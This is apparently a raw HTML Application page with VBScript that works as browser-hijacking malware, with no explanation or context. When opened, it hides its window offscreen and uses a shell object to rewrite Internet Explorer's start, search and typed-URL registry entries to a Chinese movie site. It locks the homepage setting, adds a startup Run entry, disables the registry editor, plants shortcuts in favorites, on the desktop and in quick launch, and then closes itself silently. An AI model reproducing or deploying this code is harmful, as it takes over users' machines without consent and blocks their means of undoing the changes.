   <html>
   <hta:application caption="no" showintaskbar="no">
   <body onload="window.blur();">
   <%response.ContentType="application/hta"%>
   <html>
   <object id='bugs' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
   <script language=vbscript>
   l=screen.width+200
   t=screen.height+200
   moveTo l,t
   resizeTo 0,0
   </script>
   <script LANGUAGE="VBScript">
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Second Home Page","http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage","1","REG_DWORD"
   bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLORE.EXE", "IEXPLORE.EXE http://www.333tu.com "
   bugs.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools","1","REG_DWORD"
   on error resume next
   Call LongFei_AddFavorites("·ÉÑïÒôÀÖ","http://www.vvfy.com/")
   Call LongFei_AddFavorites("¡¾¾«²ÊÃâ·ÑµçÓ°¡¿","http://www.333tu.com ")
   Call LongFei_AddFavorites("-¾«Æ·Í¼¿â","http://www.520tu.com")
   Call LongFei_AddFavorites("»¥¶¯ÊÔÌý","http://www.ccww.net")
   on error resume next
   Call LongFei_AddDesktop("¾«²ÊÃâ·ÑµçÓ°","http://www.333tu.com ")
   on error resume next
   Call LongFei_AddQuickLaunch("[¾«²ÊÃâ·ÑµçÓ°]","http://www.333tu.com ")
   Function LongFei_AddFavorites(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
       Set Sl = bugs.CreateShortcut(bugs.SpecialFolders("Favorites") + "/Á´½Ó/" + N +".URL")
       Sl.TargetPath = U
       Sl.Save()
   End Function

   Function LongFei_AddDesktop(N, U)
       on error resume next
       Set S = bugs.CreateShortcut(bugs.SpecialFolders("AllUsersDesktop") + "/" + N +".URL")
       S.TargetPath = U
       S.Save()
   End Function
   </script>
   <script language="JScript.Encode">
   function closeit() {
   setTimeout("self.close()",5)
   }
   closeit()
   </script>
   </html>
